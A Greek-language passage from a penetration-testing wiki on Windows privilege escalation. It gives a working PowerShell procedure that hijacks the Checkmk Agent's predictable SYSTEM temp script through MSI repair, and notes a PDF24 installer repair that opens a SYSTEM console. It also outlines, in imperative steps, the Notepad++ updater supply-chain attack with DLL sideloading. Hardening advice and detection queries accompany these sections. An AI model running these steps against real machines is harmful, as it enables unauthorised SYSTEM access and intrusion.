Ορισμένοι Windows agents εξακολουθούν να υλοποιούν προνομιούχες ενέργειες γράφοντας ένα προσωρινό `.cmd` στο `C:\Windows\Temp` και εκτελώντας το ως `SYSTEM`. Αν το όνομα του αρχείου είναι προβλέψιμο και η υπηρεσία δεν δημιουργεί με ασφάλεια ξανά τα υπάρχοντα αρχεία, ένας χρήστης χαμηλών προνομίων μπορεί να δημιουργήσει εκ των προτέρων το μελλοντικό temp file ως **μόνο για ανάγνωση** και να κάνει την προνομιούχα διεργασία να εκτελέσει περιεχόμενο ελεγχόμενο από τον επιτιθέμενο αντί για το δικό της script.

Παρατηρήθηκε σε ευάλωτες εκδόσεις του Checkmk Agent:
- μοτίβο temp: `cmk_all_<PID>_1.cmd`
- επηρεαζόμενοι κλάδοι: `2.0.0`, `2.1.0`, `2.2.0`
- έναυσμα: **επιδιόρθωση** του αποθηκευμένου στην cache πακέτου agent MSI<sup>[[8]](#references)[[9]](#references)</sup>

Πρακτική διαδικασία:
1. Εκτιμήστε ένα ρεαλιστικό εύρος PID από τα τρέχοντα process IDs ή το PID του εκτελούμενου agent.
2. Γράψτε ένα σύντομο **ASCII** payload `.cmd` (`Set-Content -Encoding Ascii` ή ανακατεύθυνση από `cmd.exe`· αποφύγετε έξοδο PowerShell σε UTF-16 για batch files).
3. Δημιουργήστε μαζικά αρχεία `C:\Windows\Temp\cmk_all_<PID>_1.cmd` σε όλο το υποψήφιο εύρος και ορίστε τα ως μόνο για ανάγνωση.
4. Εκκινήστε την επιδιόρθωση του αποθηκευμένου στην cache MSI, ώστε η προνομιούχα υπηρεσία να επιχειρήσει να δημιουργήσει ξανά το temp script και, στη συνέχεια, να το εκτελέσει.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Αν το ευάλωτο προϊόν έχει εγκατασταθεί με το Windows Installer, αντιστοιχίστε το MSI με το τυχαία ονομασμένο αρχείο cache στον φάκελο `C:\Windows\Installer` με το όνομα του προϊόντος, πριν ενεργοποιήσετε την επιδιόρθωση:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Operational notes:
- Το `qwinsta` είναι χρήσιμο όταν το `msiexec /fa` αποτυγχάνει από μη διαδραστικό WinRM shell και χρειάζεται να διαπιστώσετε αν μια υπάρχουσα συνεδρία επιφάνειας εργασίας ή αποσυνδεδεμένη συνεδρία μπορεί να ενεργοποιήσει σωστά την επιδιόρθωση.<sup>[[7]](#references)</sup>
- Αυτό το μοτίβο ισχύει και για άλλους endpoint agents και updaters που **τοποθετούν προσωρινά scripts σε τοποθεσίες με δικαίωμα εγγραφής από όλους και αργότερα τα εκτελούν ως SYSTEM**. Ελέγξτε για προβλέψιμα ονόματα, απουσία σημασιολογίας αποκλειστικής δημιουργίας και ροές επιδιόρθωσης/ενημέρωσης που μπορούν να ενεργοποιηθούν κατά βούληση.

### Διαδραστική επιδιόρθωση installer και προνομιούχα κονσόλα

Το PDF24 Creator 11.15.1 αποτελεί παράδειγμα ξεχωριστού κινδύνου επιδιόρθωσης MSI: η custom action εγκατάστασης του εκτυπωτή μπορεί να ανοίξει ορατή κονσόλα με δικαιώματα SYSTEM κατά την επιδιόρθωση. Ο προμηθευτής τροποποίησε το MSI installer στην έκδοση 11.15.2 για να αντιμετωπίσει αυτή τη συμπεριφορά. Μια παλαιότερη έκδοση του προϊόντος αποτελεί μόνο ένδειξη για περαιτέρω διερεύνηση. Ελέγξτε το καταχωρισμένο ή προσβάσιμο πακέτο MSI, αν αυτός ο χρήστης μπορεί να ξεκινήσει την επιδιόρθωση, αν υπάρχουν η ευάλωτη custom action και η καθυστέρηση στο αρχείο καταγραφής, καθώς και αν μια διαδραστική επιφάνεια εργασίας μπορεί να εμφανίσει την κονσόλα. Η αναφερόμενη καθυστέρηση χρησιμοποιούσε oplock στο `faxPrnInst.log`· η απλή δυνατότητα εγγραφής στο αρχείο δεν είναι η μόνη προϋπόθεση πρόσβασης. Ένα μη διαδραστικό shell, ένα μη προσβάσιμο πακέτο ή ένας ενημερωμένος installer μπορούν να διακόψουν την αλυσίδα. Αυτό το ζήτημα δεν εξαρτάται από το `AlwaysInstallElevated` και διαφέρει από την αντικατάσταση ενός προβλέψιμου προσωρινού script.

---
## Απομακρυσμένη παραβίαση της εφοδιαστικής αλυσίδας μέσω ανεπαρκούς επικύρωσης updater (WinGUp / Notepad++)

Μεταξύ Ιουνίου 2025 και Δεκεμβρίου 2025, επιτιθέμενοι που παραβίασαν την υποδομή φιλοξενίας πίσω από τη ροή ενημέρωσης του Notepad++ διέθεταν επιλεκτικά κακόβουλα manifests σε επιλεγμένα θύματα. Οι παλαιότεροι updaters που βασίζονταν στο WinGUp δεν επαλήθευαν πλήρως τη γνησιότητα των ενημερώσεων, οπότε μια κακόβουλη απόκριση XML μπορούσε να ανακατευθύνει τους clients σε URL ελεγχόμενα από τους επιτιθέμενους. Επειδή ο client αποδεχόταν περιεχόμενο HTTPS χωρίς να απαιτεί τόσο αξιόπιστη αλυσίδα πιστοποιητικών όσο και έγκυρη υπογραφή PE στο ληφθέν installer, τα θύματα κατέβαζαν και εκτελούσαν ένα trojanized NSIS `update.exe`.<sup>[[12]](#references)[[13]](#references)</sup>

Λειτουργική ροή (δεν απαιτείται τοπικό exploit):
1. **Παρέμβαση στην υποδομή**: παραβιάστε CDN/φιλοξενία και απαντήστε στους ελέγχους ενημερώσεων με metadata του επιτιθέμενου που παραπέμπουν σε κακόβουλο URL λήψης.
2. **Trojanized NSIS**: ο installer κατεβάζει/εκτελεί ένα payload και καταχράται δύο αλυσίδες εκτέλεσης:
   - **Χρήση δικού σας υπογεγραμμένου binary + sideload**: συμπεριλάβετε το υπογεγραμμένο `BluetoothService.exe` της Bitdefender και τοποθετήστε ένα κακόβουλο `log.dll` στη διαδρομή αναζήτησής του. Όταν εκτελεστεί το υπογεγραμμένο binary, τα Windows κάνουν sideload το `log.dll`, το οποίο αποκρυπτογραφεί και φορτώνει ανακλαστικά το backdoor Chrysalis (με προστασία Warbird + API hashing για να δυσχεραίνεται η στατική ανίχνευση).
   - **Εισαγωγή shellcode μέσω script**: το NSIS εκτελεί ένα μεταγλωττισμένο Lua script που χρησιμοποιεί Win32 APIs (π.χ. `EnumWindowStationsW`) για να εισαγάγει shellcode και να προετοιμάσει το Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Μέτρα hardening/ανίχνευσης για κάθε auto-updater:
- Επιβάλετε **επαλήθευση πιστοποιητικού + υπογραφής** του installer που λαμβάνεται (καρφιτσώστε τον signer του προμηθευτή, απορρίψτε ασυμφωνίες CN/αλυσίδας) και υπογράψτε το ίδιο το update manifest (π.χ. XMLDSig). Αποκλείστε ανακατευθύνσεις που καθορίζονται από το manifest, εκτός αν έχουν επικυρωθεί.
- Αντιμετωπίστε το **sideloading υπογεγραμμένου binary που παρέχεται από τον επιτιθέμενο** ως σημείο διερεύνησης μετά τη λήψη: ειδοποιήστε όταν ένα υπογεγραμμένο EXE προμηθευτή φορτώνει DLL με όνομα από τοποθεσία εκτός της κανονικής διαδρομής εγκατάστασής του (π.χ. η Bitdefender φορτώνει το `log.dll` από Temp/Downloads) και όταν ένας updater τοποθετεί/εκτελεί installers από προσωρινή τοποθεσία με υπογραφές μη προερχόμενες από τον προμηθευτή.
- Παρακολουθείτε **artefacts ειδικά για το malware** που παρατηρήθηκαν σε αυτή την αλυσίδα (χρήσιμα ως γενικά σημεία διερεύνησης): το mutex `Global\Jdhfv_1.0.1`, μη συνηθισμένες εγγραφές του `gup.exe` στο `%TEMP%` και στάδια εισαγωγής shellcode μέσω Lua.
- Το Notepad++ ενίσχυσε το WinGUp στην έκδοση v8.8.9 και σε νεότερες εκδόσεις: το XML που επιστρέφεται είναι πλέον υπογεγραμμένο (XMLDSig), ενώ οι νεότερες εκδόσεις επιβάλλουν επαλήθευση πιστοποιητικού + υπογραφής του installer που λαμβάνεται, αντί να εμπιστεύονται μόνο το transport.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Sideloading του υπογεγραμμένου από Bitdefender EXE <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> εκκινεί πρόγραμμα εγκατάστασης που δεν είναι του Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Αυτά τα μοτίβα ισχύουν για κάθε updater που αποδέχεται unsigned manifests ή δεν περιορίζει τους υπογράφοντες των installers—network hijack + malicious installer + BYO-signed sideloading οδηγούν σε remote code execution υπό το πρόσχημα «έμπιστων» ενημερώσεων.

---
## References
- [1] [Συμβουλευτικό δελτίο – Netskope Client for Windows – Τοπική κλιμάκωση προνομίων μέσω κακόβουλου διακομιστή (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Συμβουλευτικό δελτίο ασφαλείας της Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin του Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – IPC client/exploit του Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning των ASUS DriverHub, MSI Center, Acer Control Centre και Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Τοπική κλιμάκωση προνομίων μέσω εγγράψιμων αρχείων στο Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Κλιμάκωση προνομίων στον Windows agent](https://checkmk.com/werk/16361)
- [10] [PoCs του sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [PipeViewer της CyberArk](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Κρατικοί φορείς εκμεταλλεύονται την εφοδιαστική αλυσίδα του Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – ενημέρωση για το περιστατικό παραβίασης υποδομών](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Παράκαμψη της διόρθωσης για το CVE-2025-0309 στο Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Αποκάλυψη σφαλμάτων κλιμάκωσης προνομίων στο Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
